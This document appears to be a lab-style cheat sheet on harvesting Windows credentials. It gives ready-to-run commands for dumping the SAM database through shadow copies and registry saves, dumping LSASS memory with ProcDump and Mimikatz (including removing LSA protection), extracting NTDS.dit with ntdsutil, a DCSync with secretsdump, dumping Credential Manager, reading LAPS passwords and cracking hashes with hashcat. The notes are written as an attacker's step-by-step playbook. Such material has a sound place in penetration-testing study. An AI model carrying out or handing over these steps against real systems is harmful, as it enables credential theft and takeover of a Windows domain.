# Tools

- `Mimikatz`
- `secretsdump.py`
- `Get-WebCredentials.ps1`

# Accessing Credentials

## Clear-text files

The following are some of the types of clear-text files that an attacker may be interested in:

- Commands history
- Configuration files (Web App, FTP files, etc.)
- Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
- Backup files
- Shared files and folders
- Registry
- Source code

1. Checking PowerShell History:

```PowerShell
C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

2. Checking windows registry key for the "password" keyword

```PowerShell
c:\Users\user> reg query HKLM /f password /t REG_SZ /s
#OR
C:\Users\user> reg query HKCU /f password /t REG_SZ /s
```

## Database files

Applications utilize database files to read or write settings, configurations, or credentials. Database files are usually stored locally in Windows operating systems. These files are an excellent target to check and hunt for credentials.

## Active Direcotry

Active Directory stores a lot of information related to users, groups, computers, etc.

The following are some of the Active Directory misconfigurations that may leak users' credentials.

- **Users' description**: Administrators set a password in the description for new employees and leave it there, which makes the account vulnerable to unauthorized access.
- **Group Policy SYSVOL**: Leaked encryption keys let attackers access administrator accounts.
- **NTDS**: Contains AD users' credentials, making it a target for attackers.
- **AD Attacks**: Misconfiguration makes AD vulnerable to various attacks.

# Local Windows Credentials

In general, Windows operating system provides two types of user accounts: Local and Domain. Local users' details are stored locally within the Windows file system, while domain users' details are stored in the centralized Active Directory.

## Security Account Manager (SAM)

The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. Moreover, it can not be read and accessed by any users while the Windows operating system is running. However, there are various ways and attacks to dump the content of the SAM database.

### Metasploit

Use Metasploit to get the hashdump of the SAM database. This is done by using in-memory code injection to the LSASS.exe process to dump copy hashes.

```cmd
meterpreter > getuid
meterpreter > hashdump
```

### Volume Shadow Copy Service

1. Using Volume Shadow Copy Service, which helps perform a volume backup while applications read/write on volumes. This can be done using `wmic` to create a shadow volume copy. This has to be done through the command prompt with `administrator privileges` as follows:

- Run the standard cmd.exe prompt with administrator privileges.
- Execute the wmic command to create a copy shadow of C: drive
- Verify the creation from step 2 is available.
- Copy the SAM database from the volume we created in step 2

2. Run the Commands:

```PowerShell
C:\Users\Administrator>wmic shadowcopy call create Volume='C:\'

C:\Users\Administrator>vssadmin list shadows
```

3. The following path can confirm if the shadow copy is successful:
   `Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`

4. Get the decryption key which is stored in

   > c:\Windows\System32\Config\system

5. Copy both files (sam and system) from the shadow copy volume we generated to the desktop as follows,

```PowerShell
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam

C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
```

6. Transfer them to the AttackBox with your favourite method (SCP should work)

### Registry Hives

Another possible method for dumping the SAM database content is through the Windows Registry. Windows registry also stores a copy of some of the SAM database contents to be used by Windows services. Luckily, we can save the value of the Windows registry using the reg.exe tool.

1. As previously mentioned, we need two files to decrypt the SAM database's content. Ensure you run the command prompt with `Administrator privileges`.

```PowerShell
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
```

2. Decrypt the files using Impacket SecretsDump `secretsdump.py`. Move the sam and system files to the attack machine:

```cmd
python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
```

# Local Security Authority Subsystem Service (LSASS)

Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, and Kerberos tickets. Windows system stores credentials in the LSASS process to enable users to access network resources, such as file shares, SharePoint sites, and other network services, without entering credentials every time a user connects.

## Task Manager

Task manager can be used to dump any running windows process

1. Disable the LSA protection and dump credentials from memory using Mimikatz.

You will need to run cmd as Administrator to add the subprocess `mimidrv.sys` by using `!+`
```PowerShell
C:\Tools\Mimikatz> mimikatz.exe
mimikatz # privilege::debug

mimikatz # sekurlsa::logonpasswords

mimikatz # !+

mimikatz # !processprotect /process:lsass.exe /remove

```

1. Open Task Manager
2. Find LSASS.exe
3. Right click and select `Create dump file`

_Note: To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` to 1._

## Sysinternals Suite

ProcDump is a Sysinternals process dump utility that runs from the command prompt.

1. Dump any running windows process, in this case lsass.exe as follows:

```PowerShell
c:\>c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
```

## MimiKatz

Mimikatz is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory using various techniques. Mimikatz is a post-exploitation tool that enables other useful attacks, such as pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. Mimikatz deals with operating system memory to access information. Thus, it requires administrator and system privileges in order to dump memory and extract credentials.

1. Remember that the LSASS process is running as a SYSTEM. Thus in order to access users' hashes, we need a system or local administrator permissions. Thus, open the command prompt and run it as administrator. Then, execute the mimikatz binary as follows:

```PowerShell
C:\Tools\Mimikatz> mimikatz.exe

mimikatz # privilege::debug

mimikatz # sekurlsa::logonpasswords
```

# Windows Credential Manager

Credential Manager is a Windows feature that stores logon-sensitive information for websites, applications, and networks. It contains login credentials such as usernames, passwords, and internet addresses.

## Using PowerShell

We can dump the credentials using the following commands:

```PowerShell
C:\Users\Administrator>powershell -ex bypass

PS C:\Users\Administrator> Import-Module C:\Tools\Get-WebCredentials.ps1
PS C:\Users\Administrator> Get-WebCredentials
```

## Using RunAs

An alternative method of taking advantage of stored credentials is by using RunAs. RunAs is a command-line built-in tool that allows running Windows applications or tools under different users' permissions. The RunAs tool has various command arguments that could be used in the Windows system. The `/savecred` argument allows you to save the credentials of the user in Windows Credentials Manager (under the Windows Credentials section). So, the next time we execute as the same user, runas will not ask for a password.

1. By providing the `/list` argument, we can show all stored credentials

```PowerShell
C:\Users\User>cmdkey /list
```

2. Use runas to execute Windows applications as the compromized user:

```PowerShell
C:\Users\User>runas /savecred /user:DOMAIN\USER-1 cmd.exe
```

## Mimikatz

Mimikatz is a tool that can dump clear-text passwords stored in the Credential Manager from memory.

```PowerShell
C:\Users\Administrator>c:\Tools\Mimikatz\mimikatz.exe

mimikatz # privilege::debug

mimikatz # sekurlsa::credman
```

# Domain Controller

`New Technologies Directory Services (NTDS)` is a database containing all Active Directory data, including objects, attributes, credentials, etc. NTDS is located in C:\Windows\NTDS by default, and it is encrypted to prevent data extraction from a target machine. Accessing the NTDS.dit file from the machine running is disallowed since the file is used by Active Directory and is locked. `Ntdsutil` is a Windows utility to used manage and maintain Active Directory configurations.

## Local Dumping (No Credentials)

This is usually done if you have no credentials available but have administrator access to the domain controller. Therefore, we will be relying on Windows utilities to dump the NTDS file and crack them offline. As a requirement, first, we assume we have `administrator access` to a domain controller.

To successfully dump the content of the NTDS file we need the following files:

- `C:\Windows\NTDS\ntds.dit`
- `C:\Windows\System32\config\SYSTEM`
- `C:\Windows\System32\config\SECURITY`

1. The following is a one-liner PowerShell command to dump the NTDS file using the Ntdsutil tool in the `C:\temp` directory.

```PowerShell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

2. Run the secretsdump.py script to extract the hashes from the dumped memory file.

```cmd
python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
```

## Remote Dumping (With Credentials)

The DC Sync is a popular attack to perform within an Active Directory environment to dump credentials remotely. This attack works when an account (special account with necessary permissions) or AD admin account is compromised that has the following AD permissions:

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set

1. Use Impacket SecretsDump to perform DC Synchronization attack.

The `-just-dc` argument is for extracting the `NTDS` data.

```cmd
python3.9 /opt/impacket/examples/secretsdump.py -just-dc DOMAIN/<AD_Admin_User>@MACHINE_IP
```

The `-just-dc-ntlm` argument is for extracting the `NTLM` data.

```cmd
python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm DOMAIN/<AD_Admin_User>@MACHINE_IP
```

2. Use hashcat to crack the hash

```cmd
hashcat -m 1000 -a 0  /path/to/wordlist/such/as/rockyou.txt
```

# Local Administrator Password Solution (LAPS)

In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password.

The new method includes two new attributes (ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime) of computer objects in the Active Directory. The `ms-mcs-AdmPwd` attribute contains a clear-text password of the local administrator, while the `ms-mcs-AdmPwdExpirationTime` contains the expiration time to reset the password. LAPS uses `admpwd.dll` to change the local administrator password and update the value of `ms-mcs-AdmPwd`.

1. Check if LAPS is installed in the target machine, which can be done by checking the `admpwd.dll` path.

```PowerShell
C:\Users\UserTHM>dir "C:\Program Files\LAPS\CSE"
```

2. Check the available commands to use for AdmPwd cmdlets as follows:

```PowerShell
PS C:\Users\User> Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS
```

3. Find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS. We will be using the "Find-AdmPwdExtendedRights" cmdlet to provide the right OU.

```PowerShell
PS C:\Users\User> Find-AdmPwdExtendedRights -Identity <USER>

OR

PS C:\Users\thm> Find-AdmPwdExtendedRights -Identity *
```

4. Check the group and its members

```PowerShell
PS C:\Users\User> net groups "<GROUP>"
PS C:\Users\victim> net user <USER>
```

5. After compromising the right user, we can get the LAPS password using `Get-AdmPwdPassword` cmdlet by providing the target machine with LAPS enabled.

```PowerShell
PS C:\> Get-AdmPwdPassword -ComputerName creds-harvestin
```
